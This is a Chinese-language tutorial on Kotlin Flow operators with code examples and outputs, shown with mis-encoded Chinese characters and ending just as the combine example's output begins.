.hljs-meta{color:silver}.hljs-comment,.hljs-quote{color:#007400}.hljs-attribute,.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-tag{color:#aa0d91}.hljs-template-variable,.hljs-variable{color:#3f6e74}.hljs-code,.hljs-meta-string,.hljs-string{color:#c41a16}.hljs-link,.hljs-regexp{color:#0e0eff}.hljs-bullet,.hljs-number,.hljs-symbol,.hljs-title{color:#1c00cf}.hljs-meta,.hljs-section{color:#643820}.hljs-built_in,.hljs-builtin-name,.hljs-class .hljs-title,.hljs-params,.hljs-type{color:#5c2699}.hljs-attr{color:#836c28}.hljs-subst{color:#000}.hljs-formula{background-color:#eee;font-style:italic}.hljs-addition{background-color:#baeeba}.hljs-deletion{background-color:#ffc8bd}.hljs-selector-class,.hljs-selector-id{color:#9b703f}.hljs-doctag,.hljs-strong{font-weight:700}.hljs-emphasis{font-style:italic}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/45ccff6af8264a94b405eb6256e92583~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939918&amp;x-signature=A3luuQF1pk0FqsnwK7gsFyqQ%2BnY%3D" alt="0.png" loading="lazy"/></p>
<p>å®æ—¶çš„ç”¨æˆ·è¾“å…¥ã€å¤šä¸ªç½‘ç»œè¯·æ±‚çš„å“åº”ï¼Œå†åŠ ä¸Šæ•°æ®åº“çš„é¢‘ç¹æ›´æ–°ï¼Œå¾ˆå®¹æ˜“è®©ä½ çš„ä»£ç å˜å¾—æ··ä¹±ä¸å ªã€‚è€Œè¿™ï¼Œæ­£æ˜¯ Kotlin <code>Flow</code> è¦å¸®ä½ è§£å†³çš„é—®é¢˜ã€‚</p>
<p>ä½œä¸ºåŸºäºåç¨‹æ„å»ºçš„å“åº”å¼æµ APIï¼ŒKotlin <code>Flow</code> è®©ä½ å¯ä»¥ç”¨å£°æ˜å¼çš„æ–¹å¼ä¼˜é›…åœ°å¤„ç†å¼‚æ­¥æ•°æ®æµã€‚ä½†è¦æƒ³çœŸæ­£å‘æŒ¥å®ƒçš„å¼ºå¤§èƒ½åŠ›ï¼Œå…³é”®åœ¨äºç†Ÿç»ƒæŒæ¡å„ç§æ“ä½œç¬¦ã€‚</p>
<p>æœ¬æŒ‡å—å°±æ˜¯ä¸ºä½ é‡èº«æ‰“é€ çš„é€ŸæŸ¥æ‰‹å†Œâ€”â€”èšç„¦æœ€æ ¸å¿ƒçš„æ“ä½œç¬¦ï¼Œæ¸…æ™°è¯´æ˜å®ƒä»¬çš„é€‚ç”¨åœºæ™¯å’Œä½¿ç”¨æ–¹æ³•ï¼ŒåŠ©ä½ é«˜æ•ˆé©¾é©­ Kotlin <code>Flow</code>ã€‚</p>
<hr/>
<h2 data-id="heading-0">ä¸€å¯¹ä¸€è½¬æ¢</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aa9d45c2173c472786e17da65c24b33e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939918&amp;x-signature=SVd%2BnDSbrk2I1VP5MasvDPlk9I0%3D" alt="2.png" loading="lazy"/></p>
<h3 data-id="heading-1">map</h3>
<p>å°† <code>Flow</code> ä¸­å‘å‡ºçš„æ¯ä¸ªå…ƒç´ è½¬æ¢ä¸ºæ–°å…ƒç´ ï¼Œå®ç°ä¸€å¯¹ä¸€æ˜ å°„ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin">
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    flowOf(<span class="hljs-string">"Kotlin"</span>, <span class="hljs-string">"Flow"</span>)
        .map { <span class="hljs-string">"Length of '<span class="hljs-variable">$it</span>' is <span class="hljs-subst">${it.length}</span>"</span> }
        .collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// Length of 'Kotlin' is 6</span>
<span class="hljs-comment">// Length of 'Flow' is 4</span>
</code></pre>
<p>é€‚ç”¨åœºæ™¯ï¼šéœ€è¦å°†æ¯ä¸ªé¡¹è½¬æ¢ä¸ºä¸åŒç±»å‹æˆ–æ ¼å¼ï¼Œä¾‹å¦‚åœ¨ <code>ViewModel</code> ä¸­å°† <code>Date</code> å¯¹è±¡æ ¼å¼åŒ–ä¸ºå¯æ˜¾ç¤ºçš„ <code>String</code>ã€‚</p>
<h3 data-id="heading-2">filter</h3>
<p>ä»…å…è®¸æ»¡è¶³ç»™å®šæ¡ä»¶çš„å…ƒç´ é€šè¿‡ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    (<span class="hljs-number">1.</span><span class="hljs-number">.5</span>).asFlow()
        .filter { it % <span class="hljs-number">2</span> == <span class="hljs-number">0</span> }
        .collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 2</span>
<span class="hljs-comment">// 4</span>
</code></pre>
<p>é€‚ç”¨åœºæ™¯ï¼šæ ¹æ®æ¡ä»¶ä¸¢å¼ƒä¸éœ€è¦çš„å€¼ï¼Œä¾‹å¦‚è¿‡æ»¤ç©ºæœç´¢è¯æˆ–æ— æ•ˆæ•°æ®ã€‚</p>
<h3 data-id="heading-3">take</h3>
<p>é™åˆ¶æ€§æ“ä½œç¬¦ï¼Œä»…å‘å‡º <code>Flow</code> çš„å‰ <code>n</code> ä¸ªå…ƒç´ ï¼Œéšåå–æ¶ˆ <code>Flow</code> æ‰§è¡Œã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    (<span class="hljs-number">1.</span><span class="hljs-number">.10</span>).asFlow()
        .take(<span class="hljs-number">3</span>)
        .collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// 2</span>
<span class="hljs-comment">// 3</span>
</code></pre>
<p>é€‚ç”¨åœºæ™¯ï¼šåªéœ€è¦æœ‰é™æ•°é‡çš„é¡¹ï¼Œä¾‹å¦‚åˆ†é¡µåŠ è½½ï¼Œæˆ–ä»ä¸€ç³»åˆ—æ“ä½œä¸­å–ç¬¬ä¸€ä¸ªæœ‰æ•ˆç»“æœã€‚</p>
<hr/>
<h2 data-id="heading-4">ç´¯ç§¯å€¼</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ed8dfb6e502c43d9b4b7551be1fc8011~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939918&amp;x-signature=1COawG3a%2BdsCCD5sHH3RERsW0XU%3D" alt="3.png" loading="lazy"/></p>
<h3 data-id="heading-5">reduce</h3>
<p>ç»ˆç«¯æ“ä½œç¬¦ï¼Œä» <code>Flow</code> çš„ç¬¬ä¸€ä¸ªå…ƒç´ å¼€å§‹ç´¯ç§¯å€¼ï¼Œå¹¶å¯¹å½“å‰ç´¯åŠ å™¨ä¸æ¯ä¸ªå…ƒç´ æ‰§è¡Œæ“ä½œã€‚è‹¥ <code>Flow</code> ä¸ºç©ºåˆ™æŠ›å‡ºå¼‚å¸¸ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    <span class="hljs-keyword">val</span> sum = (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).asFlow().reduce { accumulator, value -&gt; accumulator + value }
    println(sum)
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 6</span>
</code></pre>
<h3 data-id="heading-6">fold</h3>
<p>ç±»ä¼¼äº <code>reduce</code>ï¼Œä½† <code>fold</code> éœ€è¦ä¸€ä¸ªåˆå§‹å€¼ï¼Œæ˜¯æ›´å®‰å…¨çš„é€‰æ‹©ã€‚</p>
<p>å³ä½¿ <code>Flow</code> ä¸ºç©ºä¹Ÿä¼šè¿”å›åˆå§‹å€¼ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    <span class="hljs-keyword">val</span> sum = (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).asFlow().fold(<span class="hljs-number">100</span>) { accumulator, value -&gt; accumulator + value }
    println(sum)
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 106</span>
</code></pre>
<h3 data-id="heading-7">runningReduce / scan</h3>
<p>ä¸­é—´æ“ä½œç¬¦ï¼Œåœ¨æ¯ä¸ªå…ƒç´ å¤„ç†æ—¶éƒ½å‘å‡ºå½“å‰ç´¯ç§¯å€¼ã€‚</p>
<p><em>ä¸­é—´æ“ä½œç¬¦ä¸ä¼šè§¦å‘ <code>Flow</code> çš„æ”¶é›†ï¼Œæ‰€ä»¥éœ€è¦ <code>collect</code> è§¦å‘ <code>Flow</code> çš„æ”¶é›†ï¼Œè€Œ <code>reduce</code> è¿™ç§ç»ˆç«¯æ“ä½œç¬¦ä¼šè§¦å‘ <code>Flow</code> çš„æ”¶é›†ã€‚</em></p>
<p><code>scan</code> æ˜¯æ›´é€šç”¨çš„ç‰ˆæœ¬ï¼Œæ”¯æŒæŒ‡å®šåˆå§‹ç§å­å€¼ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    println(<span class="hljs-string">"runningReduce:"</span>)
    (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).asFlow()
        .runningReduce { accumulator, value -&gt; accumulator + value }
        .collect { println(it) } 

    println(<span class="hljs-string">"scan:"</span>)
    (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).asFlow()
        .scan(<span class="hljs-number">0</span>) { accumulator, value -&gt; accumulator + value }
        .collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// runningReduce:</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// 3</span>
<span class="hljs-comment">// 6</span>
<span class="hljs-comment">// scan:</span>
<span class="hljs-comment">// 0</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// 3</span>
<span class="hljs-comment">// 6</span>
</code></pre>
<p>æ³¨æ„ï¼šä»–ä»¬ä¼šè¿”å›æ¯ä¸€æ­¥çš„ç»“æœï¼Œè€Œ <code>reduce</code>/<code>fold</code> åªè¿”å›æœ€ç»ˆç»“æœã€‚</p>
<p>é€‚ç”¨åœºæ™¯ï¼šè®¡ç®—ç´¯è®¡æ€»å’Œã€è·Ÿè¸ªè¿›åº¦ï¼Œæˆ–åœ¨çŠ¶æ€æœºä¸­å±•ç¤ºçŠ¶æ€å†å²ã€‚</p>
<hr/>
<h2 data-id="heading-8">å‘å‡ºå¤šä¸ªå€¼</h2>
<h3 data-id="heading-9">transform</h3>
<p>é«˜åº¦çµæ´»çš„æ“ä½œç¬¦ï¼Œå¯ä¸ºæ¯ä¸ªè¾“å…¥å…ƒç´ å‘å‡ºé›¶ä¸ªã€ä¸€ä¸ªæˆ–å¤šä¸ªå€¼ï¼Œå¯¹è¾“å‡ºæµæœ‰æ›´å¼ºæ§åˆ¶åŠ›ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    (<span class="hljs-number">1.</span><span class="hljs-number">.2</span>).asFlow()
        .transform {
            emit(<span class="hljs-string">"Item: <span class="hljs-variable">$it</span>"</span>)
            <span class="hljs-keyword">if</span> (it % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>) {
                emit(<span class="hljs-string">"...is an odd number"</span>)
            }
            emit(<span class="hljs-string">"Square: <span class="hljs-subst">${it * it}</span>"</span>)
        }.collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// Item: 1</span>
<span class="hljs-comment">// ...is an odd number</span>
<span class="hljs-comment">// Square: 1</span>
<span class="hljs-comment">// Item: 2</span>
<span class="hljs-comment">// Square: 4</span>
</code></pre>
<p>é€‚ç”¨åœºæ™¯ï¼šæ‰§è¡Œå¤æ‚è½¬æ¢ã€å¼•å…¥å‰¯ä½œç”¨ï¼ˆå¦‚æ—¥å¿—è®°å½•ï¼‰ï¼Œæˆ–æ ¹æ®å•ä¸ªè¾“å…¥æœ‰æ¡ä»¶åœ°å‘å‡ºå¤šä¸ªå€¼ã€‚</p>
<hr/>
<h2 data-id="heading-10">æ‰å¹³åŒ–åµŒå¥—</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b154009cd2e4d66b4c5014e5ae8641e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939918&amp;x-signature=MxLI8kVIGB3BJ5Zg4Ln7RIwwYns%3D" alt="4.png" loading="lazy"/></p>
<h3 data-id="heading-11">flatMapConcat</h3>
<p>å°†æ¯ä¸ªå…ƒç´ è½¬æ¢ä¸ºä¸€ä¸ª <code>Flow</code>ï¼Œç„¶åä¾æ¬¡è¿æ¥è¿™äº› <code>Flow</code>ï¼Œåªæœ‰å½“å‰ä¸€ä¸ª <code>Flow</code> å®Œæˆåï¼Œä¸‹ä¸€ä¸ªæ‰å¼€å§‹ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getNumbersFlow</span><span class="hljs-params">(id: <span class="hljs-type">Int</span>)</span></span>: Flow&lt;String&gt; = flow {
    delay(<span class="hljs-number">100</span>)
    emit(<span class="hljs-string">"First-<span class="hljs-variable">$id</span>"</span>)
    delay(<span class="hljs-number">100</span>)
    emit(<span class="hljs-string">"Second-<span class="hljs-variable">$id</span>"</span>)
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    (<span class="hljs-number">1.</span><span class="hljs-number">.2</span>).asFlow().flatMapConcat { id -&gt; getNumbersFlow(id) }.collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// First-1</span>
<span class="hljs-comment">// Second-1</span>
<span class="hljs-comment">// First-2</span>
<span class="hljs-comment">// Second-2</span>
</code></pre>
<p><em>ä»”ç»†çœ‹ï¼Œç¬¬ä¸€ä¸ªæµçš„æ¯ä¸ªæ•°å­—éƒ½ä¼šå‚ä¸åˆ°ç¬¬äºŒä¸ªæµä¸­ã€‚</em></p>
<p>é€‚ç”¨åœºæ™¯ï¼šé¡ºåºæ•æ„Ÿçš„æ“ä½œï¼Œä¾‹å¦‚ä¾æ¬¡ä¸Šä¼ å¤šä¸ªæ–‡ä»¶ï¼Œæˆ–æ‰§è¡Œä¾èµ–å‹ç½‘ç»œè¯·æ±‚ã€‚</p>
<h3 data-id="heading-12">flatMapMerge</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4254fe85b6c142c687e6a790fa6c97a9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939918&amp;x-signature=o%2FW51%2FAQwiZtZ0aXVrUeQpyxh94%3D" alt="1.png" loading="lazy"/></p>
<p>å¹¶å‘åˆå¹¶ç”±è½¬æ¢å‡½æ•°ç”Ÿæˆçš„å¤šä¸ª <code>Flow</code>ï¼Œå¯é€šè¿‡ <code>concurrency</code> å‚æ•°æ§åˆ¶å¹¶å‘æ•°é‡ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getNumbersFlow</span><span class="hljs-params">(id: <span class="hljs-type">Int</span>)</span></span>: Flow&lt;String&gt; = flow {
    delay(<span class="hljs-number">100</span>)
    emit(<span class="hljs-string">"First-<span class="hljs-variable">$id</span>"</span>)
    delay(<span class="hljs-number">100</span>)
    emit(<span class="hljs-string">"Second-<span class="hljs-variable">$id</span>"</span>)
}

<span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    (<span class="hljs-number">1.</span><span class="hljs-number">.2</span>).asFlow()
        .flatMapMerge { id -&gt; getNumbersFlow(id) }
        .collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// First-1</span>
<span class="hljs-comment">// First-2</span>
<span class="hljs-comment">// Second-2</span>
<span class="hljs-comment">// Second-1</span>
</code></pre>
<p>ä»ç»“æœä¸Šæ³¨æ„åŒºåˆ† <code>flatMapConcat</code>ï¼Œ<code>flatMapMerge</code> ä¸ä¼šä¿è¯åˆå¹¶çš„é¡ºåºã€‚</p>
<p>é€‚ç”¨åœºæ™¯ï¼šé¡ºåºæ— å…³çš„å¹¶è¡Œæ“ä½œï¼Œä¾‹å¦‚åŒæ—¶ä»å¤šä¸ªæ•°æ®æºè·å–æ•°æ®ã€‚</p>
<h3 data-id="heading-13">flatMapLatest</h3>
<p>å½“æ–°å…ƒç´ å‘å‡ºæ—¶ï¼Œç«‹å³å–æ¶ˆä¸Šä¸€ä¸ªå…ƒç´ å¯¹åº”çš„ <code>Flow</code>ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">val</span> searchQuery = flowOf(<span class="hljs-string">"search"</span>, <span class="hljs-string">"search with new term"</span>).onEach { delay(<span class="hljs-number">200</span>) }

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">searchApi</span><span class="hljs-params">(query: <span class="hljs-type">String</span>)</span></span>: Flow&lt;String&gt; = flow {
    emit(<span class="hljs-string">"Searching for '<span class="hljs-variable">$query</span>'..."</span>)
    delay(<span class="hljs-number">500</span>) <span class="hljs-comment">// æ¨¡æ‹Ÿç½‘ç»œå»¶è¿Ÿ</span>
    emit(<span class="hljs-string">"Results for '<span class="hljs-variable">$query</span>'"</span>)
}

<span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    searchQuery
        .flatMapLatest { query -&gt; searchApi(query) }
        .collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// Searching for 'search'...</span>
<span class="hljs-comment">// Searching for 'search with new term'...</span>
<span class="hljs-comment">// Results for 'search with new term'</span>
</code></pre>
<p>é€‚ç”¨åœºæ™¯ï¼šå®æ—¶æœç´¢åŠŸèƒ½ï¼Œæˆ–ä»»ä½•åªéœ€å…³æ³¨æœ€æ–°äº‹ä»¶ç»“æœçš„åœºæ™¯ã€‚</p>
<hr/>
<h2 data-id="heading-14">ä¸Šä¸‹æ–‡ä¸ç¼“å†²</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce7e6dce687947efa5a9c0ff702537f8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939918&amp;x-signature=Una%2BLIFuOR1cwRS6q6ZRLj2aj28%3D" alt="5.png" loading="lazy"/></p>
<h3 data-id="heading-15">flowOn</h3>
<p>æ›´æ”¹ç”¨äºæ‰§è¡Œä¸Šæ¸¸ <code>Flow</code> çš„ <code>CoroutineContext</code>ï¼Œæ˜¯ <code>Flow</code> ä¸­åˆ‡æ¢è°ƒåº¦å™¨çš„æ­£ç¡®æ–¹å¼ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">heavyWork</span><span class="hljs-params">()</span></span>: Flow&lt;<span class="hljs-built_in">Int</span>&gt; = flow {
    println(<span class="hljs-string">"Starting heavy work on <span class="hljs-subst">${Thread.currentThread().name}</span>"</span>)
    <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">1.</span><span class="hljs-number">.3</span>) {
        <span class="hljs-comment">// Simulate CPU-intensive work</span>
        Thread.sleep(<span class="hljs-number">100</span>)
        emit(i)
    }
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    heavyWork()
        .flowOn(Dispatchers.IO) <span class="hljs-comment">// Upstream runs on IO dispatcher</span>
        .collect {
            println(<span class="hljs-string">"Collected <span class="hljs-variable">$it</span> on <span class="hljs-subst">${Thread.currentThread().name}</span>"</span>)
        }
    <span class="hljs-comment">// Downstream runs on the collector's context (e.g., Main)</span>
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// Starting heavy work on DefaultDispatcher-worker-1</span>
<span class="hljs-comment">// Collected 1 on main</span>
<span class="hljs-comment">// Collected 2 on main</span>
<span class="hljs-comment">// Collected 3 on main</span>
</code></pre>
<h3 data-id="heading-16">buffer</h3>
<p>é€šè¿‡è§£è€¦ç”Ÿäº§è€…ä¸æ¶ˆè´¹è€…å®ç°å¹¶å‘æ‰§è¡Œï¼šç”Ÿäº§è€…å°†é¡¹æ”¾å…¥ç¼“å†²åŒºï¼Œæ¶ˆè´¹è€…ä»ä¸­å–å‡ºã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> time = measureTimeMillis {
        flow {
            <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">1.</span><span class="hljs-number">.3</span>) {
                delay(<span class="hljs-number">200</span>) <span class="hljs-comment">// Simulate slow emission</span>
                emit(i)
            }
        }
        .buffer() <span class="hljs-comment">// With buffer, the total time is closer to the slow collector's time</span>
        .collect {
            delay(<span class="hljs-number">300</span>) <span class="hljs-comment">// Simulate slow collection</span>
            println(it)
        }
    }
    println(<span class="hljs-string">"Collected in <span class="hljs-variable">$time</span> ms"</span>)
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// 2</span>
<span class="hljs-comment">// 3</span>
<span class="hljs-comment">// Collected in 1172 ms</span>
</code></pre>
<p>å¾—ç›Šäº <code>buffer</code>ï¼Œæœ€åæ•´ä¸ªæ•°æ®çš„æ”¶é›†æ—¶é—´è¦å°äº <code>(200 + 300) * 3</code>ã€‚</p>
<p>ä½¿ç”¨åœºæ™¯ï¼šå½“ç”Ÿäº§è€…ä¸æ¶ˆè´¹è€…å¤„ç†é€Ÿåº¦ä¸ä¸€è‡´æ—¶ï¼Œæå‡æ€§èƒ½ã€‚</p>
<h3 data-id="heading-17">conflate</h3>
<p>ä¸€ç§ç¼“å†²å½¢å¼ï¼Œå½“æ”¶é›†å™¨å¤„ç†å¤ªæ…¢æ—¶ä¼šä¸¢å¼ƒä¸­é—´å€¼ï¼Œç¡®ä¿å§‹ç»ˆè·å–æœ€æ–°å€¼ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    flow {
        <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">1.</span><span class="hljs-number">.5</span>) {
            delay(<span class="hljs-number">100</span>)
            emit(i)
        }
    }
    .conflate()
    .collect { value -&gt;
        println(<span class="hljs-string">"Started processing <span class="hljs-variable">$value</span>"</span>)
        delay(<span class="hljs-number">300</span>)
        println(<span class="hljs-string">"Finished processing <span class="hljs-variable">$value</span>"</span>)
    }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// Started processing 1</span>
<span class="hljs-comment">// Finished processing 1</span>
<span class="hljs-comment">// Started processing 3</span>
<span class="hljs-comment">// Finished processing 3</span>
<span class="hljs-comment">// Started processing 5</span>
<span class="hljs-comment">// Finished processing 5</span>
</code></pre>
<p>é€‚ç”¨åœºæ™¯ï¼šUI æ›´æ–°ä¸­æ— éœ€æ˜¾ç¤ºä¸­é—´çŠ¶æ€ï¼Œå¦‚è‚¡ç¥¨è¡Œæƒ…æˆ– GPS ä½ç½®æ›´æ–°ã€‚</p>
<h3 data-id="heading-18">collectLatest</h3>
<p>ç»ˆç«¯æ“ä½œç¬¦ï¼Œå½“æ–°å€¼å‘å‡ºæ—¶ï¼Œå–æ¶ˆå¯¹å‰ä¸€ä¸ªå€¼çš„æ”¶é›†é€»è¾‘ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).asFlow()
        .onEach { delay(<span class="hljs-number">100</span>) }
        .collectLatest { value -&gt;
            println(<span class="hljs-string">"Collecting <span class="hljs-variable">$value</span>"</span>)
            delay(<span class="hljs-number">300</span>)
            println(<span class="hljs-string">"Finished collecting <span class="hljs-variable">$value</span>"</span>)
        }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// Collecting 1</span>
<span class="hljs-comment">// Collecting 2</span>
<span class="hljs-comment">// Collecting 3</span>
<span class="hljs-comment">// Finished collecting 3</span>
</code></pre>
<p><em>æ³¨æ„çœ‹è¿™é‡Œçš„ç»“æœï¼ŒFinished collecting åªæ”¶é›†äº†æœ€åä¸€æ¬¡çš„å€¼ï¼Œä¸€å®šè¦æ³¨æ„è¿™ä¸ªç‰¹æ€§ã€‚</em></p>
<p>é€‚ç”¨åœºæ™¯ï¼šæŸé¡¹æ“ä½œè€—æ—¶è¾ƒé•¿ï¼Œä¸”åº”åœ¨æ–°é¡¹åˆ°è¾¾æ—¶è¢«å–æ¶ˆï¼Œä¾‹å¦‚å°†ç”¨æˆ·è¾“å…¥ä¿å­˜åˆ°æ•°æ®åº“ã€‚</p>
<hr/>
<h2 data-id="heading-19">åˆå¹¶</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/debdb8739b2a4d94b5ac4348155e0fb9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939918&amp;x-signature=7%2B6T%2FLUhSUM1fiRI0Bihj%2Bxro4c%3D" alt="6.png" loading="lazy"/></p>
<h3 data-id="heading-20">zip</h3>
<p>ç­‰å¾…ä¸¤ä¸ª <code>Flow</code> å„è‡ªå‘å‡ºä¸€é¡¹åè¿›è¡Œç»„åˆã€‚ä»»ä¸€æº <code>Flow</code> ç»“æŸï¼Œç»“æœ <code>Flow</code> å³ç»“æŸã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> flowA = (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).asFlow()
    <span class="hljs-keyword">val</span> flowB = flowOf(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>, <span class="hljs-string">"D"</span>)

    flowA.zip(flowB) { number, letter -&gt; <span class="hljs-string">"<span class="hljs-variable">$number</span><span class="hljs-variable">$letter</span>"</span> }
        .collect { println(it) } 
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 1A</span>
<span class="hljs-comment">// 2B</span>
<span class="hljs-comment">// 3C</span>
</code></pre>
<h3 data-id="heading-21">combine</h3>
<p>ç»„åˆä¸¤ä¸ª <code>Flow</code> çš„æœ€æ–°å€¼ã€‚åªè¦ä»»ä¸€æº <code>Flow</code> å‘å‡ºæ–°å€¼ï¼ˆä¸”åŒæ–¹è‡³å°‘å„å‘å‡ºè¿‡ä¸€æ¬¡ï¼‰ï¼Œå°±ä¼šè§¦å‘ä¸€æ¬¡å‘å°„ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> flowA = (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).asFlow().onEach { delay(<span class="hljs-number">100</span>) }
    <span class="hljs-keyword">val</span> flowB = flowOf(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>).onEach { delay(<span class="hljs-number">150</span>) }

    flowA.combine(flowB) { number, letter -&gt; <span class="hljs-string">"<span class="hljs-variable">$number</span><span class="hljs-variable">$letter</span>"</span> }
        .collect { println(it) }
}

<span class="hljs-comment">// output:</span>
